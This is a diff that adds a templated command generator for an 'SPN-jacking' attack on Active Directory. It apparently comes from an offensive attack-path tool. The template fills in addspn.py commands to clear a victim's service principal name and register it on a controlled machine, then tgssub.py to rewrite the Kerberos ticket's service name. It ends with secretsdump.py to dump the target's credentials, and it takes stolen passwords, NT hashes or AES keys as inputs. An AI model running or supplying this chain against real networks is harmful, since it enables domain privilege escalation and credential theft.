@@ -1,0 +1,43 @@
+{% set controlled = require['object'] %}
+# SPN-Jacking: clear the SPN on {{target.name}} and register it on {{controlled.obj.name}}
+# Reference: https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/
+# Modifying the servicePrincipalName attribute may generate 5136 events on the domain
+# controller if an appropriate SACL is in place on the target object.
+# Note the current SPN(s) on the victim before proceeding (check BloodHound or run):
+# ldapsearch -H ldap://{{dc_ip}} -b '{{target.dn}}' servicePrincipalName
+
+# Step 1: Clear the SPN on {{target.name}}
+{% if parent.krb_auth %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -clear
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{parent.secret|red}} -t '{{target.name}}' -clear
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{parent.secret|red}} -t '{{target.name}}' -clear
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{target.name}}' -clear
+{%- endif %}
+
+# Step 2: Register the hijacked SPN on your controlled machine ({{controlled.obj.name}})
+{% if controlled.secret_type == T_SECRET_NTHASH %}
+./tools/addspn.py '{{fqdn}}/{{controlled.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{controlled.secret|red}} -t '{{controlled.obj.name}}' -add '<VICTIM_SPN>'
+{%- elif controlled.secret_type == T_SECRET_AESKEY %}
+./tools/addspn.py '{{fqdn}}/{{controlled.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{controlled.secret|red}} -t '{{controlled.obj.name}}' -add '<VICTIM_SPN>'
+{%- elif controlled.secret_type == T_SECRET_PASSWORD %}
+./tools/addspn.py '{{fqdn}}/{{controlled.obj.name}}:{{controlled.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{controlled.obj.name}}' -add '<VICTIM_SPN>'
+{%- endif %}
+
+# Step 3: Request a ST for the hijacked SPN then substitute the service name
+# tgssub replaces the sname so the ticket is usable against the victim host
+{% if parent.krb_auth %}
+tgssub.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -k -no-pass -dc-ip {{dc_ip}} -spn '<VICTIM_SPN>' -altservice 'cifs/{{target_no_dollar}}'
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+tgssub.py '{{fqdn}}/{{parent.obj.name}}' -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}} -spn '<VICTIM_SPN>' -altservice 'cifs/{{target_no_dollar}}'
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+tgssub.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -aesKey {{parent.secret|red}} -dc-ip {{dc_ip}} -spn '<VICTIM_SPN>' -altservice 'cifs/{{target_no_dollar}}'
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+tgssub.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -dc-ip {{dc_ip}} -spn '<VICTIM_SPN>' -altservice 'cifs/{{target_no_dollar}}'
+{%- endif %}
+
+# Use the resulting ticket
+export KRB5CCNAME=<ticket.ccache>
+secretsdump.py -k -no-pass {{target_no_dollar}}.{{fqdn}}
